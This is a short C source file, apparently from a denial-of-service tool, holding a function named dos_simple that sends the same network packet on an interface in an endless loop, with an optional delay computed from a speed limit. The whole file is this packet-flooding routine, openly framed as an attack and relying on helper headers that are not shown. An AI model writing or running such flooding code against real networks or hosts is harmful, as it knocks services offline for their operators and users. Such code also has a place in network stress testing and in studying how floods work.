#include "dos.h"
#include "util.h"
#include "network.h"

void dos_simple(packet_t* packet,double speed_limit){
	int sleep=0;
	if(speed_limit!=0.0){
	   sleep=(int)((double)packet->sz/(1000.0*speed_limit));
	}
	for(;;){
	   if(sleep){
	      sleep_ms(sleep);
	   }
	   packet_send(packet->iface, packet);
	}
}	

